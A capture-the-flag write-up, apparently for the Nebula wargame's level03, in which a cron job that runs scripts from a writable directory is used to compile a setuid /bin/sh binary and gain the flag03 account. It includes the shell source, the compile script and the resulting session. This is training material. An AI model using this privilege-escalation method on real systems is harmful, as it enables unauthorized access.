# Level03

Check the home directory of **flag03** and take note of the files there.
There is a crontab that is called every couple of minutes.

To do this level, log in as the **level03** account with the password level03.
Files for this level can be found in /home/flag03.

## Source code

There is no source code available for this level.

## Solution

We have a crontab that will execute all files inside the writtable.d/ directory and then delete the files. The scripts inside the writtabl.d directory will be ran with the same permissions as the flag03 account, so we can compile a binary that will spawn a shell and then enable the setuid bit. Since the binary will be compiled as the flag03 account, when we run it with our level03 account we will be able to execute commands as if we were the flag03 account.
So here's the step
Back in our home directory /home/level03 we create the source code for our shell program in a file named shell.c:
logseq.order-list-type:: number

```c
int main(){
	system("/bin/sh");
	return 0;
}

```

Then inside the /home/flag03/writtable.d we create the file compile.sh with the following contents:
logseq.order-list-type:: number

```bash
#!/bin/bash

cp /home/level03/shell.c .
gcc shell.c -o shell
chmod 4777 shell

```

So we basically copy the source code for our shell program to the current dir which will the the homedir of flag03, compile it using gcc and then enable the setuid bit as well as execution bit for others so we are able to execute it once compiled
All that is left is to wait for the crontab to run and then we will have a shell setuid binary owned by the target account flag03. Once we execute it we will be presented with a shell as the flag03 account. Then all it's left is to execute the getflag command:
logseq.order-list-type:: number

```
level03@nebula:/home/flag03$ ./shell
sh-4.2$ whoami
flag03
sh-4.2$ getflag
You have successfully executed getflag on a target account

```
